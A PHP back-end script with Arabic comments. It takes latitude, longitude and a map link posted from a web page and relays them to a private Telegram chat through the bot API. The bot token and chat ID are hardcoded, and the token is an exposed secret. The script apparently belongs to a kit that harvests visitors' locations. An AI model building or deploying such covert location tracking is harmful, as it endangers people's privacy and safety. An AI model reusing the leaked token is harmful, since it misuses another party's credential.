<?php
// إعدادات بوت تيليجرام
$botToken = "8075471456:AAHL1J_CTzkAp--8ka0pGqDO0GRnwJBkQOA";
$chatId = "6068331455";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['latitude']) && isset($_POST['longitude']) && isset($_POST['link'])) {
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];
    $googleMapsLink = $_POST['link'];

    // تنسيق الرسالة
    $telegramMessage = "1. خط الطول: " . $longitude . "\n";
    $telegramMessage .= "2. خط العرض: " . $latitude . "\n";
    $telegramMessage .= "3. الرابط: " . $googleMapsLink;

    // ترميز الرسالة بالكامل
    $encodedMessage = urlencode($telegramMessage);
    
    // بناء رابط API
    $api_url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . $encodedMessage;

    // إرسال الرسالة باستخدام cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // التحقق من نجاح الإرسال
    if ($httpCode == 200) {
        http_response_code(200);
        echo "تم إرسال الموقع بنجاح.";
    } else {
        http_response_code(500);
        echo "حدث خطأ في إرسال الموقع: " . $response;
    }
} else {
    http_response_code(400);
    echo "بيانات غير صالحة.";
}
?>
